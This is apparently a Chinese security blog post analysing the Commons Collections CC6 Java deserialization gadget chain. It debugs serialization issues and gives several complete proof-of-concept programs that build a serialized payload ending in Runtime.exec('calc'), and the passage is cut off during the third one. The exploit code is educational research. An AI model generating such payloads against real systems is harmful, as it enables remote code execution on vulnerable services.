title="回顾CC5链"></a>回顾CC5链</h2><ul><li>生成<code>LazyMap</code>对象，将<code>InvokerTransformer</code>利用方法串起来的<code>ChainedTransformer</code>对象传入<code>LazyMap</code>构造方法。</li><li>将<code>LazyMap</code>对象传入<code>TiedMapEntry</code>类构造方法，再通过<code>TiedMapEntry.toString()</code>方法去调用<code>TiedMapEntry.getValue()</code>方法，最后调用到<code>lazyMap.get()</code>方法。</li><li>将<code>TiedMapEntry</code>对象通过反射赋值给<code>BadAttributeValueExpException</code>类的<code>val</code>值，通过反序列化<code>BadAttributeValueExpException</code>类对象，调用重写<code>readObject</code>方法中的<code>val.toString()</code>。</li><li><code>val.toString()</code>调用等效于<code>TiedMapEntry.toString()</code>，即调用<code>TiedMapEntry.getValue()</code>方法，达到调用<code>lazyMap.get()</code>方法触发代码执行。</li></ul><h2 id="CC6链分析"><a href="#CC6链分析" class="headerlink" title="CC6链分析"></a>CC6链分析</h2><p>在CC5中提到，调用<code>LazyMap.get()</code>方法，找到的新的入口<code>TiedMapEntry.getValue()</code>中调用的<code>get()</code>方法</p><p><img src="/posts/9758c0a8/cc6-1.png" title="TiedMapEntry.getValue()"></p><p>然后顺势寻找<code>getValue()</code>的调用情况，<code>TiedMapEntry</code>本类中有三个方法进行了调用</p><p><img src="/posts/9758c0a8/cc6-2.png" title="调用情况"></p><p>其中CC5就是<code>BadAttributeValueExpException</code>类调用了<code>toString()</code>方法形成的新入口。</p><p>除了<code>toString()</code>方法外，还有<code>hashCode()</code>和<code>equals()</code>，<code>hashCode()</code>能联想到<code>HashMap</code>，在学CC5的时候看到这三个方法我以为就是利用<code>hashCode()</code>，结果是<code>toString()</code>的调用链。</p><h3 id="实现思路一：HashMap"><a href="#实现思路一：HashMap" class="headerlink" title="实现思路一：HashMap"></a>实现思路一：HashMap</h3><p>继续看<code>hashCode()</code>的调用联想到的<code>HashMap</code>。</p><p><img src="/posts/9758c0a8/cc6-3.png" title="put值"></p><p><code>HashMap</code>在<code>put</code>值时，会对<code>key</code>进行<code>hash</code>操作，会调用<code>hash()</code>，其中<code>hash()</code>方法调用<code>key</code>参数的<code>hashCode()</code>方法，且key参数是可控的，为了调用<code>TiedMapEntry.hashCode()</code>，只需要将<code>TiedMapEntry</code>对象作为key传入<code>hash(Object key)</code>方法中，便能调用<code>TiedMapEntry.hashCode()</code>，达到执行代码的目的。</p><p><img src="/posts/9758c0a8/cc6-3.png" title="hash()"><br><img src="/posts/9758c0a8/cc6-4.png" title="执行效果"></p><p>执行效果：</p><p><img src="/posts/9758c0a8/cc6-5.png" title="hashCode()"></p><p>这时候就能触发代码执行了，开始想的<code>hashmap</code>也可以直接序列化，为啥就不直接把<code>hashmap</code>对象给序列化，虽然在本地会触发一次代码执行，但也算是个利用链，但在序列化和反序列化的过程发现都存在问题</p><p><img src="/posts/9758c0a8/cc6-6.png" title="报错"></p><h4 id="报错排查"><a href="#报错排查" class="headerlink" title="报错排查"></a>报错排查</h4><p>序列化过程报错<code>java.lang.ProcessImpl</code>，该对象无法序列化导出抛出异常，开始想半天也不知道这个对象是哪来的，随后进行序列化调试<br>因为是对<code>hashmap</code>对象进行的序列化，且<code>hashmap</code>重写了序列化和反序列化过程，所以直接断点重写的序列化步骤就行</p><p><img src="/posts/9758c0a8/cc6-7.png" title="断点"></p><p><code>hashmap</code>的序列化写入显示经过<code>defaultWriteObject()</code>默认的序列化写入，然后还会经过<code>internalWriteEntries()</code>序列化检查，通过断点下来给我感觉作用就是把<code>hashmap</code>放入<code>table</code>中对每个<code>Key-value</code>进行序列化写入，然后遍历每个map的元素依次序列化调用<code>defaultWriteObject()</code>方法</p><p>直接进<code>internalWriteEntries()</code>方法查看<code>Map</code>对象的情况，此时<code>table</code>中只有一个<code>key=TiedMapEntry</code>对象，该对象为我们<code>put</code>进的对象，</p><p><img src="/posts/9758c0a8/cc6-8.png" title="TM对象"></p><p>读取到<code>table</code>对象元素后进行<code>writeObject</code>写入，并判断元素类型，进入对应的序列化步骤</p><p><img src="/posts/9758c0a8/cc6-9.png" title="元素对象判断"></p><p>随后在序列化读取数据的，发现此时还存在另外一个<code>Key</code>元素，<code>key</code>值是<code>11</code>，也就是说<code>hashmap</code>的另外一个<code>map</code>中还存在一对键值对，<code>key</code>值为<code>11</code></p><p><img src="/posts/9758c0a8/cc6-10.png" title="map元素"></p><p>随后遍历到<code>key</code>值为<code>11</code>的元素后 会再次序列化，重复重写的<code>writeObject()</code>步骤去写入另一个<code>map</code>中元素</p><p><img src="/posts/9758c0a8/cc6-11.png" title="map元素"></p><p>此时序列化<code>table</code>内容就变为另外一个<code>map</code>的元素内容：<code>key</code>为<code>11</code>，<code>value</code>为<code>ProcessImpl</code>对象，随后再对<code>value</code>进行序列化写入的时候，由于<code>ProcessImpl</code>对象不可被序列化，导致抛出异常</p><p>序列化报错的原因找到了，现在就是找到为啥会多出来添加一组元素的<code>map</code>对象</p><p>由于序列化操作是已经对代码进行了编译，也就是说前面的代码已经被执行过了然后再对<code>hashmap</code>对象进行序列化，在序列化前<code>hashmap</code>的存在两个<code>map</code>，其中分别存在1组元素</p><p>回到<code>LazyMap.get()</code>这个触发点，在本地put值时会触发一次代码执行，此时的运行步骤</p><p><img src="/posts/9758c0a8/cc6-12.png" title="LazyMap.get()"></p><p>可以看到当前的<code>key</code>为<code>11</code>，为<code>TiedMapEntry</code>对象创建时传入构造方法的<code>key</code>值，会判断<code>map</code>中是否存在<code>key</code>为<code>11</code>的元素，当前由于<code>map</code>只有一个<code>TiedMapEntry</code>对象的<code>key</code>元素，不存在<code>key</code>为<code>11</code>的元素，因此会进入判断体，执行<code>factory.transform(key)</code>触发了代码执行，随后将返回来的值<code>ProcessImpl</code>对象赋值给<code>value</code>变量，然后进行<code>map.put(key，value)</code>，此时<code>key</code>为<code>11</code>，<code>value</code>为<code>TiedMapEntry</code>，因此当前<code>map</code>对象中会多出一组元素，导致序列化报错。</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">TiedMapEntry TM=<span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(Lmap,<span class="number">11</span>);</span><br><span class="line">hm.put(TM,<span class="number">111</span>);</span><br></pre></td></tr></table></figure><p>同时由于本地触发了漏洞，添加了<code>map</code>元素，导致反序列化时，<code>map</code>中已经存在<code>Key</code>为<code>11</code>的元素，因此不会进入判断体，不会触发代码执行。</p><h4 id="解决序列化问题"><a href="#解决序列化问题" class="headerlink" title="解决序列化问题"></a>解决序列化问题</h4><p>因此需要将新多出来的<code>map</code>元素进行删除，对象为<code>LazyMap.decorate(map,transformerChain)</code>传递进的<code>map</code>对象</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">Map</span> <span class="variable">map</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line"><span class="comment">//创建LazyMap对象调用decorate回调方法</span></span><br><span class="line">Map Lmap= LazyMap.decorate(map,transformerChain);</span><br><span class="line">Map hm=<span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">TiedMapEntry TM=<span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(Lmap,<span class="number">11</span>);</span><br><span class="line">hm.put(TM,<span class="number">111</span>);</span><br><span class="line"><span class="comment">//删除map对象的新增的元素，避免序列化出错以及触发点失效</span></span><br><span class="line">map.remove(<span class="number">11</span>);</span><br></pre></td></tr></table></figure><p>此时序列化就不会再报错，同时反序列化也能触发漏洞。</p><p><img src="/posts/9758c0a8/cc6-13.png" title="解决序列化问题"></p><h4 id="解决本地触发问题"><a href="#解决本地触发问题" class="headerlink" title="解决本地触发问题"></a>解决本地触发问题</h4><p>解决本地触发，可以直接把触发点制空，在put完元素后，再通过反射把触发点设置给<code>Lazymap</code>，实现方法很多，原理都是一样的，都时是通过在put值时不触发<code>Runtime.exec()</code>就行，可以先制空或者填加一个正常的<code>ConstantTransformer</code>方法都可以。</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">        <span class="comment">//获取Runtime类对象</span></span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">        <span class="comment">//反射调用getMethod方法，获取Runtime类的getRuntime方法，返回Runtime.getRuntime()方法，此时并未执行该方法，因此并未实例化</span></span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>]&#125;),</span><br><span class="line">        <span class="comment">//反射调用invoke方法，执行Runtime.getRuntime()方法，实现Runtime对象的实例化并返回Runtime对象</span></span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>]&#125;),</span><br><span class="line">        <span class="comment">//反射调用exec方法，并执行该方法</span></span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;)</span><br><span class="line">&#125;;</span><br><span class="line"><span class="comment">//创建一个空的链转换器</span></span><br><span class="line">Transformer[] transformersfake = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;&#125;;</span><br><span class="line"><span class="comment">//通过链转换器进行循环调用transformers数组</span></span><br><span class="line"><span class="type">Transformer</span> <span class="variable">transformerChainfake</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformersfake);</span><br><span class="line"><span class="comment">//通过链转换器进行循环调用transformers数组</span></span><br><span class="line"><span class="type">Transformer</span> <span class="variable">transformerChain</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line"><span class="type">Map</span> <span class="variable">map</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line"><span class="comment">//创建LazyMap对象调用decorate回调方法</span></span><br><span class="line">Map Lmap= LazyMap.decorate(map,transformerChainfake);</span><br><span class="line">Map hm=<span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">TiedMapEntry TM=<span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(Lmap,<span class="number">11</span>);</span><br><span class="line">hm.put(TM,<span class="number">111</span>);</span><br><span class="line"><span class="comment">//删除map对象的新增的元素，避免序列化出错以及触发点失效</span></span><br><span class="line">map.remove(<span class="number">11</span>);</span><br><span class="line"><span class="comment">//通过反射将触发链转换器赋值给factory变量</span></span><br><span class="line">Field field=LazyMap.class.getDeclaredField(<span class="string">&quot;factory&quot;</span>);</span><br><span class="line">field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">field.set(Lmap,transformerChain);</span><br></pre></td></tr></table></figure><h4 id="POC-1"><a href="#POC-1" class="headerlink" title="POC-1"></a>POC-1</h4><p>解决了上面问题，再加上序列化和反序列化步骤就得到完整POC，这里也不再写构造POC过程了，根据分析就得到大部分步骤了组合起来就行。</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="comment">//获取Runtime类对象</span></span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                <span class="comment">//反射调用getMethod方法，获取Runtime类的getRuntime方法，返回Runtime.getRuntime()方法，此时并未执行该方法，因此并未实例化</span></span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>]&#125;),</span><br><span class="line">                <span class="comment">//反射调用invoke方法，执行Runtime.getRuntime()方法，实现Runtime对象的实例化并返回Runtime对象</span></span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>]&#125;),</span><br><span class="line">                <span class="comment">//反射调用exec方法，并执行该方法</span></span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="comment">//创建一个空的链转换器</span></span><br><span class="line">        Transformer[] transformersfake = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;&#125;;</span><br><span class="line">        <span class="comment">//通过链转换器进行循环调用transformers数组</span></span><br><span class="line">        <span class="type">Transformer</span> <span class="variable">transformerChainfake</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformersfake);</span><br><span class="line">        <span class="comment">//通过链转换器进行循环调用transformers数组</span></span><br><span class="line">        <span class="type">Transformer</span> <span class="variable">transformerChain</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line">        <span class="type">Map</span> <span class="variable">map</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        <span class="comment">//创建LazyMap对象调用decorate回调方法</span></span><br><span class="line">        Map Lmap= LazyMap.decorate(map,transformerChainfake);</span><br><span class="line">        Map hm=<span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        TiedMapEntry TM=<span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(Lmap,<span class="number">11</span>);</span><br><span class="line">        hm.put(TM,<span class="number">111</span>);</span><br><span class="line">        <span class="comment">//删除map对象的新增的元素，避免序列化出错以及触发点失效</span></span><br><span class="line">        map.remove(<span class="number">11</span>);</span><br><span class="line">        Field field=LazyMap.class.getDeclaredField(<span class="string">&quot;factory&quot;</span>);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field.set(Lmap,transformerChain);</span><br><span class="line">        </span><br><span class="line">        <span class="comment">//最后生成序列化文件，反序列化实现命令执行</span></span><br><span class="line">        <span class="keyword">try</span>&#123;</span><br><span class="line">            <span class="type">ObjectOutputStream</span> <span class="variable">outputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;cc6payload.ser&quot;</span>));</span><br><span class="line">            outputStream.writeObject(hm);</span><br><span class="line">            outputStream.close();</span><br><span class="line"></span><br><span class="line">            <span class="type">ObjectInputStream</span> <span class="variable">inputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="string">&quot;cc6payload.ser&quot;</span>));</span><br><span class="line">            inputStream.readObject();</span><br><span class="line">            inputStream.close();</span><br><span class="line">        &#125;<span class="keyword">catch</span>(Exception e)&#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>实现效果：</p><p><img src="/posts/9758c0a8/cc6-14.png" title="实现效果"></p><h4 id="疑惑"><a href="#疑惑" class="headerlink" title="疑惑"></a>疑惑</h4><p>在上面的所有分析都基于 新建立了一个hashmap对象去put TiedMapEntry对象的分析，如下面的hm变量。开始没想那么多，单纯新建了一个hashmap对象想去触发漏洞，直到在学习分析思路二的时候，回过头看到代码，有个疑惑“为啥要多建立一个hashmap对象去触发，已经有一个hashmap对象了(如下面代码的map变量)，直接用map变量去put进TiedMapEntry对象不就行了”</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">Map</span> <span class="variable">map</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line"><span class="comment">//创建LazyMap对象调用decorate回调方法</span></span><br><span class="line">Map Lmap= LazyMap.decorate(map,transformerChainfake);</span><br><span class="line">Map hm=<span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">TiedMapEntry TM=<span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(Lmap,<span class="number">11</span>);</span><br><span class="line">hm.put(TM,<span class="number">111</span>);</span><br><span class="line">map.remove(<span class="number">11</span>);</span><br></pre></td></tr></table></figure><p>然后将代码改成下面过后，本以为效果还是一样的，但运行过后发现，如果不要<code>map.remove(11);</code>即不删除map中key为11的元素，依旧能反序列化触发漏洞，而上面分析中新建hashmap对象去put进TiedMapEntry对象的话，必须要删除第一个hashmap对象中的key为11元素才能触发。</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">Map</span> <span class="variable">map</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line"><span class="comment">//创建LazyMap对象调用decorate回调方法</span></span><br><span class="line">Map Lmap= LazyMap.decorate(map,transformerChainfake);</span><br><span class="line">TiedMapEntry TM=<span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(Lmap,<span class="number">11</span>);</span><br><span class="line">map.put(TM,<span class="number">111</span>);</span><br><span class="line"><span class="comment">//map.remove(11);</span></span><br></pre></td></tr></table></figure><p>在调试过程中也发现运行完<code>map.put(TM,111);</code>后，也添加了key为11的元素，此时ma已经存在key为11的元素</p><p><img src="/posts/9758c0a8/cc6-20.png" title="map元素"></p><p>那在反序列化的时候，在触发漏洞点时不是应该<code>map.containsKey(key)</code>值为true吗，为什么实际运行结果是false然后触发漏洞</p><p><img src="/posts/9758c0a8/cc6-21.png" title="判断条件"></p><p>调试找下原因，<code>hashmap</code>重写了反序列化<code>readObject</code>，那在反序列化处打断点看看怎么读取数据的。<br><code>readObject</code>的前面部分代码就是获取一些序列化流的一些信息，然后在创建node节点，读取流中的map信息，依次把key和value进行put还原。<br>在关键读取map中下断点</p><p><img src="/posts/9758c0a8/cc6-22.png" title="断点分析"></p><p>可以看到第一个读取还原的<code>Map</code>元素，<code>key</code>为<code>TiedMapEntry</code>，<code>value</code>为<code>111</code></p><p><img src="/posts/9758c0a8/cc6-23.png" title="第一次还原元素"></p><p>读出来后，进行<code>putVal()</code>写入还原<code>hashmap</code>，其中会有<code>hash(key)</code>操作，跟进hash</p><p><img src="/posts/9758c0a8/cc6-24.png" title="hash操作"></p><p>然后调用到<code>hashCode()</code>,跟进<code>hashCode()</code>,调用<code>getValue()</code>,再跟进<code>getValue()</code>,进入到<code>get</code>方法中</p><p><img src="/posts/9758c0a8/cc6-25.png" title="get方法"></p><p>进入到判断体中，触发漏洞</p><p><img src="/posts/9758c0a8/cc6-26.png" title="触发漏洞"></p><p>可以看到当前的table表中没有任何元素，因此能进入判断体中触发漏洞，然后再Put添加元素</p><p><img src="/posts/9758c0a8/cc6-27.png" title="table表"></p><p>然后再跳过断点，回到主循环体，这时候读取第二组元素，此时的Key为11，然后再进行put操作</p><p><img src="/posts/9758c0a8/cc6-28.png" title="读取第二组元素"></p><p>至此，简述就是反序列化过程中，最先读取到<code>map</code>的<code>key</code>为<code>TiedMapEntry</code>的元素，然后进行<code>put</code>时由于<code>map</code>中没有存在<code>key</code>为<code>11</code>的元素，因此能够触发漏洞，触发完漏洞过后再还原写入<code>key</code>为<code>11</code>的元素。</p><p>同hashmap对象操作能触发的原因找到了，再看看不同hashmap对象操作时，同样不删除key为11的元素，为什么就不行</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">Map</span> <span class="variable">map</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">Map hm=<span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line"><span class="comment">//创建LazyMap对象调用decorate回调方法</span></span><br><span class="line">Map Lmap= LazyMap.decorate(map,transformerChainfake);</span><br><span class="line">TiedMapEntry TM=<span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(Lmap,<span class="number">11</span>);</span><br><span class="line">hm.put(TM,<span class="number">111</span>);</span><br></pre></td></tr></table></figure><p>同样下断点，此时读取的元素&lt;key,value&gt;为(11,11)，不是上面情况的<code>key</code>为<code>TiedMapEntry</code>的元素，因此最开始就读取key为11的元素写入到map中，自然不会触发漏洞了</p><p><img src="/posts/9758c0a8/cc6-29.png" title="读取元素"></p><p>如果添加<code>map.remove(11);</code>删除key为11的步骤，在反序列化时读取的map元素就为<code>TiedMapEntry</code>元素，就能正常触发漏洞。</p><p><img src="/posts/9758c0a8/cc6-30.png" title="读取元素"></p><p>至此，原因找到了，但第二种情况为什么先还原的key为11，我的猜测：<br>第二种情况，由于第一个hashmap对象先创建，对第二个hashmap对象进行put操作，编译序列化写入的时候按顺序将第一个hashmap对象先写入此时已经将编译完成的值写入，导致在反序列化读取的时候第一个hashmap对象已经存在key为11的元素；而第一种情况，对同一个hashmap对象进行操作，顺序也是先Put进TiedMapEntry为Key，触发漏洞后，再创建put一个key为11的元素，所以序列化时第一个还原key为TiedMapEntry的map元素。</p><h4 id="POC-2"><a href="#POC-2" class="headerlink" title="POC-2"></a>POC-2</h4><p>通过上面遇到的疑惑，同hashmap对象也能触发漏洞，就得到了第二个poc</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="comment">//获取Runtime类对象</span></span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                <span class="comment">//反射调用getMethod方法，获取Runtime类的getRuntime方法，返回Runtime.getRuntime()方法，此时并未执行该方法，因此并未实例化</span></span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>]&#125;),</span><br><span class="line">                <span class="comment">//反射调用invoke方法，执行Runtime.getRuntime()方法，实现Runtime对象的实例化并返回Runtime对象</span></span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>]&#125;),</span><br><span class="line">                <span class="comment">//反射调用exec方法，并执行该方法</span></span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="comment">//创建一个空的链转换器</span></span><br><span class="line">        Transformer[] transformersfake = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;&#125;;</span><br><span class="line">        <span class="comment">//通过链转换器进行循环调用transformers数组</span></span><br><span class="line">        <span class="type">Transformer</span> <span class="variable">transformerChainfake</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformersfake);</span><br><span class="line">        <span class="comment">//通过链转换器进行循环调用transformers数组</span></span><br><span class="line">        <span class="type">Transformer</span> <span class="variable">transformerChain</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line">        <span class="type">Map</span> <span class="variable">map</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        <span class="comment">//创建LazyMap对象调用decorate回调方法</span></span><br><span class="line">        Map Lmap= LazyMap.decorate(map,transformerChainfake);</span><br><span class="line">        TiedMapEntry TM=<span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(Lmap,<span class="number">11</span>);</span><br><span class="line">        map.put(TM,<span class="number">111</span>);</span><br><span class="line">        Field field=LazyMap.class.getDeclaredField(<span class="string">&quot;factory&quot;</span>);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field.set(Lmap,transformerChain);</span><br><span class="line">        </span><br><span class="line">        <span class="comment">//最后生成序列化文件，反序列化实现命令执行</span></span><br><span class="line">        <span class="keyword">try</span>&#123;</span><br><span class="line">            <span class="type">ObjectOutputStream</span> <span class="variable">outputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;cc6payload.ser&quot;</span>));</span><br><span class="line">            outputStream.writeObject(map);</span><br><span class="line">            outputStream.close();</span><br><span class="line"></span><br><span class="line">            <span class="type">ObjectInputStream</span> <span class="variable">inputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="string">&quot;cc6payload.ser&quot;</span>));</span><br><span class="line">            inputStream.readObject();</span><br><span class="line">            inputStream.close();</span><br><span class="line">        &#125;<span class="keyword">catch</span>(Exception e)&#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><h4 id="POC-3"><a href="#POC-3" class="headerlink" title="POC-3"></a>POC-3</h4><p>上面学习的时候通过反射修改链转换器来实现本地序列化时触发的代码执行，还可以通过反射修改hashmap的key值，达到规避本地触发的问题。<br>hashmap底层通过table表将map的键值对存储到table表的node节点对象中，修改hashmap的key值，实际就是修改table中的key值</p><p>先通过反射获取hashmap的table表属性</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">Field</span> <span class="variable">table</span> <span class="operator">=</span> HashMap.class.getDeclaredField(<span class="string">&quot;table&quot;</span>);</span><br><span class="line">table.setAccessible(<span class="literal">true</span>);</span><br><span class="line">Object[] tablearray = (Object[])table.get(map);</span><br></pre></td></tr></table></figure><p>然后获取table表中存在key的元素，也就是要修改的元素，由于不同环境下key值存在的序号不同，就写了个循环去查找避免找不到，比如我这序号是13</p><p><img src="/posts/9758c0a8/cc6-31.png" title="读取元素"></p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//对node进行初始化</span></span><br><span class="line"><span class="type">Object</span> <span class="variable">node</span> <span class="operator">=</span> tablearray[<span class="number">0</span>];</span><br><span class="line"><span class="comment">//获取table表中目标元素，也就是要修改的元素,由于序号不同（比如我这是13），写了个直接遍历序号不为null的表示存在Key</span></span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;tablearray.length;i++)&#123;</span><br><span class="line">    <span class="keyword">if</span>(tablearray[i]==<span class="literal">null</span>)&#123;</span><br><span class="line">        <span class="keyword">continue</span>;</span><br><span class="line">    &#125;</span><br><span class="line">   node = tablearray[i];</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>最后反射更改key值为触发对象</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//修改元素的key值为TiedMapEntry</span></span><br><span class="line"><span class="type">Field</span> <span class="variable">key</span> <span class="operator">=</span> node.getClass().getDeclaredField(<span class="string">&quot;key&quot;</span>);</span><br><span class="line">key.setAccessible(<span class="literal">true</span>);</span><br><span class="line">key.set(node,TM);</span><br></pre></td></tr></table></figure><p>最后进行序列化和反序列化即可，得到完整POC</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="comment">//获取Runtime类对象</span></span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                <span 